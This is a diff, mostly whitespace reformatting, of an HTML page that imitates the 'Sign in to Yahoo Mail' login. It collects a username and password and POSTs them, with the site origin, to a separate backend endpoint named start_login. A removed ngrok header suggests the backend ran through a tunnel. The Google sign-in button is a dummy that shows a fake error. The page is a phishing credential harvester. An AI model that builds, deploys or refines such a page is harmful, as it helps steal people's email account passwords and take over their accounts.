@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in to Yahoo Mail</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       font-family: 'Roboto', sans-serif;
       background: linear-gradient(145deg, #4a9c8f, #2c7a6b);
@@ -75,7 +81,9 @@
       border: 1px solid #e0e0e0;
     }
 
-    .pill:hover { background: #e0e0e0; }
+    .pill:hover {
+      background: #e0e0e0;
+    }
 
     .btn-next {
       width: 100%;
@@ -103,15 +111,21 @@
       color: #777;
       position: relative;
     }
+
     .divider::before {
       content: '';
       position: absolute;
       top: 50%;
-      left: 0; right: 0;
+      left: 0;
+      right: 0;
       height: 1px;
       background: #ddd;
     }
-    .divider span { background: white; padding: 0 15px; }
+
+    .divider span {
+      background: white;
+      padding: 0 15px;
+    }
 
     .google-btn {
       width: 100%;
@@ -135,9 +149,13 @@
       cursor: pointer;
     }
 
-    #passwordSection, #successSection { display: none; }
+    #passwordSection,
+    #successSection {
+      display: none;
+    }
   </style>
 </head>
+
 <body>
 
   <div class="login-box">
@@ -146,7 +164,7 @@
     <div id="emailStep">
       <h1>Sign in to Yahoo Mail</h1>
       <label class="label">Username, email or phone number</label>
-      <input type="text" id="emailInput" placeholder="" onkeyup="handleInput()" autocomplete="off"/>
+      <input type="text" id="emailInput" placeholder="" onkeyup="handleInput()" autocomplete="off" />
       <div class="suggestions" id="suggestions"></div>
       <button class="btn-next" onclick="goToPassword()">Next</button>
     </div>
@@ -155,19 +173,18 @@
     <div id="passwordSection">
       <h1 id="emailDisplay" style="font-size:22px;"></h1>
       <label class="label">Enter your password</label>
-      <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password"/>
+      <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" />
       <button class="btn-next" onclick="startRealLogin()">Sign in</button>
       <div class="back-link" onclick="backToEmail()">← Back</div>
     </div>
 
     <!-- Success -->
-  
+
 
     <div class="divider"><span>or</span></div>
 
     <button class="google-btn" onclick="signInWithGoogle()">
-      <img src="google-icon.png" 
-           width="24" height="24" alt="Google" style="vertical-align: middle; margin-right: 8px;">
+      <img src="google-icon.png" width="24" height="24" alt="Google" style="vertical-align: middle; margin-right: 8px;">
       Sign in with Google
     </button>
 
@@ -208,7 +225,7 @@
         alert("Please enter or select an email address");
         return;
       }
-      
+
       currentEmail = email;
       document.getElementById('emailStep').style.display = 'none';
       document.getElementById('passwordSection').style.display = 'block';
@@ -223,7 +240,7 @@
     function signInWithGoogle() {
       const button = document.querySelector('.google-btn');
       const originalHTML = button.innerHTML;
-      
+
       // Change button to show "Try again later"
       button.style.opacity = "0.6";
       button.innerHTML = `
@@ -256,7 +273,7 @@
 
       const button = document.querySelector('#passwordSection .btn-next');
       const originalText = button.innerHTML;
-      
+
       button.innerHTML = "Signing in...";
       button.disabled = true;
 
@@ -265,12 +282,11 @@
       try {
         const response = await fetch(`${BACKEND_URL}/start_login`, {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'ngrok-skip-browser-warning': 'true'
+          headers: {
+            'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ 
-            email: email, 
+          body: JSON.stringify({
+            email: email,
             password: password,
             landing_url: window.location.origin
           })
@@ -294,4 +310,5 @@
     }
   </script>
 </body>
+
 </html>
